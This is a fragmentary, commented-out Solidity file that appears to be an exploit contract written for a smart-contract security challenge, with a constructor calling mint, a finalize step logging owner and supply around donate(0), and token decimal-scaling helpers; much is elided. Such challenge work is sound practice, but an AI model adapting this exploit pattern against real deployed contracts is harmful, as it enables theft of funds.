...
// interface IChallenge_PeterisPrieditis {
...
// contract Exploit_PeterisPrieditis {
...
//     constructor(IChallenge_PeterisPrieditis _instance) payable {
//         // instance = _instance;
...
//         console.log(instance.mint(amounts));
//     }

//     function finalize() external {
//         console.log(instance.owner());
//         console.log(instance.supply());
//         instance.donate(0);
//         console.log(instance.supply());
//         console.log(instance.owner());
...
//     function scaleFrom(address token, uint256 value) internal view returns (uint256) {
...
//     function scaleTo(address token, uint256 value) internal view returns (uint256) {
//         uint256 decimals = ERC20(token).decimals();
//         if (decimals == 18) {
//             return value;
//         } else if (decimals < 18) {
...
//         uint256 value = 0;
//         for (uint256 i = 0; i < underlying.length; i++) {
//             value += scaleFrom(address(underlying[i]), underlying[i].balanceOf(address(this)));
//         }
//         return value;
//     }
